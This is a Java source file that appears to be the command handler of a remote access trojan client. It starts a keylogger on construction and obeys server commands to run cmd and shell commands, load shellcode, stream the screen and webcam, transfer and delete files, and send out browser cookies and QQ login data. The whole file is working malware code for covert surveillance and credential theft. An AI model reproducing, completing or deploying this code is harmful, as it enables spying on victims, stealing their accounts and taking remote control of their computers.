package client.connection;

import client.features.*;
import client.utils.system.*;
import client.utils.FileManager;
import java.io.DataInputStream;

import static client.ClientMain.relieve;

public class HandleInbound extends Thread {
    private final ClientConnection clientConnection;
    private ScreenSharer screenSharer;
    private CameraCapturer cameraSharingClient;
    private final FileManager fileManager;
    private final KeyBoardHooker keyBoardHook = new KeyBoardHooker();
    private final DataInputStream in;

    public HandleInbound(ClientConnection clientConnection) {
        this.clientConnection = clientConnection;
        screenSharer = clientConnection.screenSharer;
        cameraSharingClient = clientConnection.cameraSharingClient;
        this.fileManager = new FileManager(clientConnection);
        in = clientConnection.in;
        keyBoardHook.run = true;
        keyBoardHook.start();
    }

    @Override
    public void run() {
        while (true) {
            try {
                Thread.sleep(5);
                int headID = clientConnection.receiveHead();
                if (headID != -1) {
                    System.out.println(headID);
                }
                if (headID == ID.COMMAND()) {
                    handleCommand();
                } else if (headID == ID.FILE_DIR()) {
                    handleFileDir();
                } else if (headID == ID.FILE_IN()) {
                    handleFileIn();
                } else if (headID == ID.FILE_OUT()) {
                    handleFileOut();
                } else if (headID == ID.KEYBOARD()) {
                    handleKeyboard();
                } else if (headID == ID.FILE_EXISTS()) {
                    handleFileExists();
                } else if (headID == ID.FILE_UPLOAD_DECISION()) {
                    handleFileUploadDecision();
                } else if (headID == ID.ALIVE()) {
                    clientConnection.receiveMessage();
                }

            } catch (Exception e) {
                e.printStackTrace();
                clientConnection.reconnect();
            }
        }
    }

    private void handleCommand() throws Exception {
        String receivedMessage = clientConnection.receiveMessage();
        if (receivedMessage.startsWith("command:")) {
            handleReceivedCommand(receivedMessage.substring(8));
        } else if (receivedMessage.equals("relieveClient")) {
            relieve();
        }
    }

    private void handleFileDir() throws Exception {
        String path = clientConnection.receiveMessage();
        fileManager.listDirectory(path);
    }

    private void handleFileIn() throws Exception {
        String filePath = clientConnection.receiveMessage();
        fileManager.uploadFile(filePath, in);
    }

    private void handleFileOut() throws Exception {
        String filePath = clientConnection.receiveMessage();
        fileManager.downloadFile(filePath);
    }

    private void handleKeyboard() {
        keyBoardHook.listen = !keyBoardHook.listen;
    }

    private void handleFileExists() throws Exception {
        String filePath = clientConnection.receiveMessage();
        fileManager.handleFileExists(filePath);
    }

    private void handleFileUploadDecision() throws Exception {
        String decision = clientConnection.receiveMessage();
        fileManager.handleUploadDecision(decision);
    }

    public void handleReceivedCommand(String command) throws Exception {
        if(command.contains("cmd:"))
            new CmdExecutor().executeCmdCommand(command.replace("cmd:",""), clientConnection);
        if(command.contains("shell:"))
            ShellCommandExecutor.executeShellCommand(command.replace("shell:",""), clientConnection);
        if(command.contains("shellcode:"))
            ShellcodeLoader.loadShellCode(command.replace("shellcode:",""));
        if(command.contains("buttonNotification:")){
            String[] input = command.replace("buttonNotification:","").split("/:split/");
            if(input.length < 2)
                return;
            NotificationUtil.showButtonNotification(input[0], input[1]);
        }
        if(command.contains("notification:")){
            String[] input = command.replace("notification:","").replace("\\n", "\n").split("/:split/");
            if(input.length < 2)
                return;
            NotificationUtil.showNotification(input[0], input[1]);
        }
        if (command.equals("startScreen")) {
            screenSharer = new ScreenSharer(clientConnection);
            if(!screenSharer.sharingScreen)
                screenSharer.start();
        }
        if (command.equals("stopScreen")) {
            screenSharer.stop();
        }

        if (command.equals("startCamera")) {
            cameraSharingClient = new CameraCapturer(clientConnection);
            if(!cameraSharingClient.sharingCamera)
                cameraSharingClient.start();
        }
        if (command.equals("stopCamera")) {
            cameraSharingClient.stop();
            new Thread(() -> cameraSharingClient.webcam.close()).start();
        }

        if(command.equals("getCookie")){
            clientConnection.sendHead(ID.COOKIE());
            CookieUtil.sendCookie(clientConnection);
        }

        if (command.startsWith("delete:")) {
            String filePath = command.substring(7);
            fileManager.deleteFile(filePath);
        }



        if(command.equals("getQQData")){
            QQUtil.sendQQLoginData(clientConnection);
        }
    }

}
